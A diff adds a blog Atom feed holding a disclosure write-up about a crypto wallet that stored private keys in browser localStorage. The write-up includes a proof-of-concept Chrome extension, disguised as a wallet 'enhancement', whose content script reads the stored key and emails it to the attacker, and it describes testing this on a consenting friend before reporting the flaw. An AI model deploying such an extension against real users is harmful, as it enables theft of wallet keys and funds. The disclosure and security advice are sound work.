@@ -1,0 +1,122 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+    <title>Andrey Krisanov - crypto</title>
+    <subtitle>Engineering notes and essays on AI infrastructure, large-scale inference systems, and production-grade backend design — from distributed serving and observability to performance tuning and reliability. Written by Andrey Krisanov.</subtitle>
+    <link rel="self" type="application/atom+xml" href="https://akrisanov.com/tags/crypto/atom.xml"/>
+    <link rel="alternate" type="text/html" href="https://akrisanov.com"/>
+    <generator uri="https://www.getzola.org/">Zola</generator>
+    <updated>2023-08-05T00:00:00+00:00</updated>
+    <id>https://akrisanov.com/tags/crypto/atom.xml</id>
+    <entry xml:lang="en">
+        <title>Accidentally found a vulnerability in a crypto wallet and made $1,000</title>
+        <published>2023-08-05T00:00:00+00:00</published>
+        <updated>2023-08-05T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              Unknown
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://akrisanov.com/crypto-wallet-vulnerability/"/>
+        <id>https://akrisanov.com/crypto-wallet-vulnerability/</id>
+        
+        <content type="html" xml:base="https://akrisanov.com/crypto-wallet-vulnerability/">&lt;p&gt;In January 2022, I joined the community of one of the proof-of-stake blockchains.
+To play with what the protocol and its ecosystem offered, I created a wallet account on
+the official website &lt;code&gt;https:&#x2F;&#x2F;wallet.****.org&lt;&#x2F;code&gt;. Apart from general curiosity, I was interested in
+how they achieved security in a browser, especially in the age of extensions and
+client-side vulnerabilities.&lt;&#x2F;p&gt;
+&lt;p&gt;It turned out that when a user logged in, the wallet application (built in React) generated a set
+of public and private keys and stored them in the browser&#x27;s local storage. With my experience of
+building authentication and authorization in distributed systems, I knew this was not the best
+thing to do – in general, it&#x27;s easy for a browser extension and client-side code to read data
+from local storage &lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#1&quot;&gt;1&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;To prove this, I decided to &lt;a rel=&quot;noopener external&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;developer.chrome.com&#x2F;docs&#x2F;extensions&#x2F;mv3&#x2F;getstarted&#x2F;development-basics&#x2F;&quot;&gt;write a simple extension for Chrome&lt;&#x2F;a&gt; that would retrieve keys from a victim&#x27;s browser and send them to my
+anonymous email address.&lt;&#x2F;p&gt;
+&lt;p&gt;The root directory of my pickpocket extension looked like this:&lt;&#x2F;p&gt;
+&lt;pre class=&quot;giallo&quot; style=&quot;color-scheme: light dark; color: light-dark(#1F2328, #DCE6DF); background-color: light-dark(#FAFAF8, #131917);&quot;&gt;&lt;code data-lang=&quot;shellscript&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#1F6A4A, #FFFFFF);&quot;&gt;.&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#1F6A4A, #FFFFFF);&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt; content.js&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#1F6A4A, #FFFFFF);&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt; email.min.js&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#1F6A4A, #FFFFFF);&quot;&gt;├──&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt; index.html&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#1F6A4A, #FFFFFF);&quot;&gt;└──&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt; manifest.json&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The main files are the &lt;code&gt;manifest.json&lt;&#x2F;code&gt; and &lt;code&gt;content.js&lt;&#x2F;code&gt;. The former is essential for installing the extension.&lt;&#x2F;p&gt;
+&lt;pre class=&quot;giallo&quot; style=&quot;color-scheme: light dark; color: light-dark(#1F2328, #DCE6DF); background-color: light-dark(#FAFAF8, #131917);&quot;&gt;&lt;code data-lang=&quot;json&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;{&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#0D5F89, #ECCDBB);font-style: italic;&quot;&gt;  &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0D5F89, #ECCDBB);font-style: italic;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0D5F89, #ECCDBB);font-style: italic;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt; &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt;X Wallet Enhancement&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#0D5F89, #ECCDBB);font-style: italic;&quot;&gt;  &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0D5F89, #ECCDBB);font-style: italic;&quot;&gt;version&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0D5F89, #ECCDBB);font-style: italic;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt; &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt;1.0&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#0D5F89, #ECCDBB);font-style: italic;&quot;&gt;  &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0D5F89, #ECCDBB);font-style: italic;&quot;&gt;manifest_version&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0D5F89, #ECCDBB);font-style: italic;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#9A4D00, #EFBA5D);&quot;&gt; 3&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#0D5F89, #ECCDBB);font-style: italic;&quot;&gt;  &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0D5F89, #ECCDBB);font-style: italic;&quot;&gt;content_scripts&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0D5F89, #ECCDBB);font-style: italic;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt; [&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    {&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#0D5F89, #ECCDBB);font-style: italic;&quot;&gt;      &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0D5F89, #ECCDBB);font-style: italic;&quot;&gt;matches&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0D5F89, #ECCDBB);font-style: italic;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt; [&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt;        &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt;https:&#x2F;&#x2F;wallet.****.org&#x2F;*&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;      ]&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#0D5F89, #ECCDBB);font-style: italic;&quot;&gt;      &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0D5F89, #ECCDBB);font-style: italic;&quot;&gt;js&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0D5F89, #ECCDBB);font-style: italic;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt; [&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt;        &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt;email.min.js&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt;        &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt;content.js&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;      ]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    }&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;  ]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;code&gt;email.min.js&lt;&#x2F;code&gt; is just a client library from one of the cloud services that allows you to send
+email directly from a browser without any server code. &lt;code&gt;index.html&lt;&#x2F;code&gt; is a blank HTML page that
+displays nothing. The wallet hijacking logic lived in the &lt;code&gt;content.js&lt;&#x2F;code&gt; file:&lt;&#x2F;p&gt;
+&lt;pre class=&quot;giallo&quot; style=&quot;color-scheme: light dark; color: light-dark(#1F2328, #DCE6DF); background-color: light-dark(#FAFAF8, #131917);&quot;&gt;&lt;code data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#0550AE, #A4A0E8);&quot;&gt;emailjs&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#1F6A4A, #FFFFFF);&quot;&gt;init&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt;user_****&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;;&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#6A737D, #6A7C81);font-style: italic;&quot;&gt; &#x2F;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#6A737D, #6A7C81);font-style: italic;&quot;&gt; instantiating an email delivery service&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#7A2E59, #ECCDBB);font-style: italic;&quot;&gt;let&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0550AE, #A4A0E8);&quot;&gt; templateParams&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#7A2E59, #ECCDBB);&quot;&gt; =&lt;&#x2F;span&gt;&lt;span&gt; {&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#6A737D, #6A7C81);font-style: italic;&quot;&gt;    &#x2F;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#6A737D, #6A7C81);font-style: italic;&quot;&gt; gathering information about the victim&amp;#39;s browser&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    from_name&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0550AE, #A4A0E8);&quot;&gt; navigator&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0550AE, #A4A0E8);&quot;&gt;userAgent&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#6A737D, #6A7C81);font-style: italic;&quot;&gt;    &#x2F;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#6A737D, #6A7C81);font-style: italic;&quot;&gt; fetching wallet keys from the local storage&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    storage&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0550AE, #A4A0E8);&quot;&gt; window&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0550AE, #A4A0E8);&quot;&gt;localStorage&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#1F6A4A, #FFFFFF);&quot;&gt;getItem&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt;_*:wallet:active_account_id_**&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;}&lt;&#x2F;span&gt;&lt;span&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#6A737D, #6A7C81);font-style: italic;&quot;&gt;&#x2F;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#6A737D, #6A7C81);font-style: italic;&quot;&gt; using a prepared email template to send an email with keys&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#7A2E59, #ECCDBB);font-style: italic;&quot;&gt;const&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0550AE, #A4A0E8);&quot;&gt; serviceID&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#7A2E59, #ECCDBB);&quot;&gt; =&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt; &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt;service_****&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#7A2E59, #ECCDBB);font-style: italic;&quot;&gt;const&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0550AE, #A4A0E8);&quot;&gt; templateID&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#7A2E59, #ECCDBB);&quot;&gt; =&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt; &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt;template_****&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#0550AE, #A4A0E8);&quot;&gt;emailjs&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#1F6A4A, #FFFFFF);&quot;&gt;send&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0550AE, #A4A0E8);&quot;&gt;serviceID&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0550AE, #A4A0E8);&quot;&gt; templateID&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0550AE, #A4A0E8);&quot;&gt; templateParams&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt; .&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#1F6A4A, #FFFFFF);&quot;&gt;then&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#7A2E59, #ECCDBB);font-style: italic;&quot;&gt; =&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; {&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#0550AE, #A4A0E8);&quot;&gt;    console&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#1F6A4A, #FFFFFF);&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt;Wallet keys were send!&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0F6F5C, #CCCCCC);&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt; }&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span&gt; (&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0550AE, #A4A0E8);font-style: italic;&quot;&gt;err&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#7A2E59, #ECCDBB);font-style: italic;&quot;&gt; =&amp;gt;&lt;&#x2F;span&gt;&lt;span&gt; {&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span style=&quot;color: light-dark(#0550AE, #A4A0E8);&quot;&gt;    console&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#1F6A4A, #FFFFFF);&quot;&gt;error&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0550AE, #A4A0E8);&quot;&gt;JSON&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#1F6A4A, #FFFFFF);&quot;&gt;stringify&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color: light-dark(#0550AE, #A4A0E8);&quot;&gt;err&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt; }&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Yes, such a dummy script.&lt;&#x2F;p&gt;
+&lt;p&gt;I packed all four files into a zip archive and kindly asked my friend, who also had
+a wallet at &lt;code&gt;https:&#x2F;&#x2F;wallet.***.org&lt;&#x2F;code&gt;, to install my creation in his browser
+(pretending to do some social engineering). Before doing so, I told him about my findings and
+the theory I was trying to prove. He was happy to help, and the public and private keys of
+this wallet account appeared in my inbox a few seconds after the browser extension was installed.
+Next, I saved the keys to local storage in my browser and opened the wallet website.&lt;&#x2F;p&gt;
+&lt;p&gt;Surprisingly, my friend&#x27;s crypto-wallet balance was available to me, along with an option to
+withdraw the funds. During a Zoom call with my victim friend, I transferred some of his funds to
+an anonymous account and back. It was mind-blowing! A new, promising blockchain that had recently
+closed an investment round had a major vulnerability in its wallet. Worst of all, they had 2-factor
+authentication for users. Of course, not many people would activate it right away, and many didn&#x27;t.&lt;&#x2F;p&gt;
+&lt;p&gt;As an ethical developer, I created a vulnerability report, including the source code of
+the browser extension and my thoughts on how to improve the security of the web application.
+It was sent directly to the security team&#x27;s email address on 18th of January. A few days later,
+I had a call with the CISO of the blockchain protocol, who assured me that they were aware of
+the issue and would address it in the next release. I was a little disappointed with the speed of
+the response to the incident. Two days is an eternity when one speaks about users&#x27; money.
+Nevertheless, the blockchain developers granted me their tokens in an amount equivalent to 1,000 USDT.&lt;&#x2F;p&gt;
+&lt;div class=&quot;callout callout-danger&quot;&gt;
+&lt;strong&gt;Advice for application developers&lt;&#x2F;strong&gt;: be aware of the technologies you use and their security aspects.
+&lt;&#x2F;div&gt;
+&lt;div class=&quot;callout callout-warning&quot;&gt;
+&lt;strong&gt;Advice for crypto users&lt;&#x2F;strong&gt;: learn what security options an organisation offers to you,
+activate two-factor authentication as soon as you create a wallet account, don&#x27;t store all of
+your funds in hot wallets.
+&lt;&#x2F;div&gt;
+&lt;div class=&quot;footnote-definition&quot; id=&quot;1&quot;&gt;&lt;sup class=&quot;footnote-definition-label&quot;&gt;1&lt;&#x2F;sup&gt;
+&lt;p&gt;Worth reading:&lt;&#x2F;p&gt;
+&lt;&#x2F;div&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a rel=&quot;noopener external&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;snyk.io&#x2F;blog&#x2F;is-localstorage-safe-to-use&#x2F;&quot;&gt;Is LocalStorage safe to use? | Snyk&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a rel=&quot;noopener external&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;www.rdegges.com&#x2F;2018&#x2F;please-stop-using-local-storage&#x2F;&quot;&gt;Please Stop Using Local Storage&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a rel=&quot;noopener external&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;developer.mozilla.org&#x2F;en-US&#x2F;docs&#x2F;Web&#x2F;HTTP&#x2F;Cookies&quot;&gt;Using HTTP cookies - HTTP | MDN&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a rel=&quot;noopener external&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;owasp.org&#x2F;www-community&#x2F;HttpOnly&quot;&gt;HttpOnly | OWASP Foundation&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+</content>
+        
+    </entry>
+</feed>
